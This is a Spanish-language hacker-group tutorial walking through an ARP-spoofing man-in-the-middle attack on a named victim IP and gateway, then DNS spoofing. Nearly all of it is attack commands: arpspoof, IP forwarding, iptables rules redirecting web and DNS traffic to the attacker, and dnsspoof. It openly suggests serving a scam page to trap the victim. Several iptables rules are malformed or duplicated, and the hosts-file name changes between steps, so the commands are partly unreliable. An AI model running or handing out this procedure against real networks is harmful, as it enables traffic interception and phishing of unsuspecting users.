_Este es un pequeño ejemplo de como realizar un ataque de hombre en medio y dns._ 
 
*Texto original por #D4rKM1nD*

Maquina víctima: addr:192.168.1.233
Dirección del gateway: 192.168.1.1 

*Console 1*:
arpspoof -i eth0 -t 192.168.1.1 192.168.1.233


*Console 2*:
arpspoof -i eth0 -t 192.168.1.233 192.168.1.1


*_Con eso estamos envenenando la arp de la víctima y el gateway_*
_Cada segundo está mandando un paquete arp repply_

~La dirección física que muestra es la correspondiente al de eth0.~

_Con este ataque todos los paquetes que pacen entre el gateway y víctima pasarán por nosotros antes._


*Console 3*:
*Entonces nuestra máquina tiene que funcionar solo como pasadera*. 
*#D4M1*
_Tenemos que editar los siguientes ficheros:_
Enruta los paquetes entre gateway y víctima: echo 1 > /proc/sys/net/ipv4/ip_forward 

_Filtrar los paquetes DNS, esto para que las respuestas DNS las realicemos nosotros mismos:_
1.-iptables --flush 

2.-iptables --zero 

3.-iptables --delete-chain

4.-iptables -F -t nat 

5.-iptables --append FORWARD --in-interface eth0 --jump ACCEPT 

6.-iptables --table nat --append POSTROUTING --out-interface eth0 --jump MASQUERADE

7.-iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination 192.168.1.169 

8.-iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination 192.168.1.169 

9.-iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.1.1 --dport 53 -m state --state NEW, ESTABLISHED -j DROP

10.-iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 1024:65535 -m state ESTABLISHED -j DROP

11.-iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.1.1 --dport 53 -m state --state NEW, ESTABLISHED -j DROP

12.-iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP

13.-iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j DNAT --to 192.168.1.169

14.-iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j DNAT --to 192.168.1.169


_Podemos usar dnsSpoof para resolver las peticiones del objetivo a una arbitraria_:
nano dnsSpoof.txt 

La dirección IP: 192.168.1.169 está asociada a la interfaz de red eth0: ifconfig 



Dado que las respuestas contienen la dirección IP de la víctima... 
Todas las peticiones DNS se redirigiran a la IP:192.168.1.169


*Ataque con DNS Spoofed*
dnsspoof -i eth0 -f dnsSpoofed.txt

Se va a la víctima y se ejecuta el comando arp... 
Se podrá ver que la dirección del gateway está asociada a la dirección física de nuestra interfaz de red.

Si consulta cualquier dominio se mostrará nuestro servidor web, ejecutándose en nuestra IP... 

¿De que sirve esto? 
Pues podríamos montar en nuestro servidor un scam de cualquier tipo y obligar a que el usuario pille en nuestra trampa... 
O tan solo, solo dejar una página montada de error para joder a nuestra víctima.


*Contenido creado y editado por D4RKM1ND cualquier uso del mismo en fines educativos pronunciar su origen...*
*NO SOMOS RESPONSABLES DE SU MAL USO*

*#D4M1*

*#BROKENMINDS*

*#D4RKM1ND*

_Somos Hackers No Delincuentes_. 


_La Libertad No Se Súplica, Se Conquista_. 

*AÚN SE ENCUENTRA EN EDICIÓN*





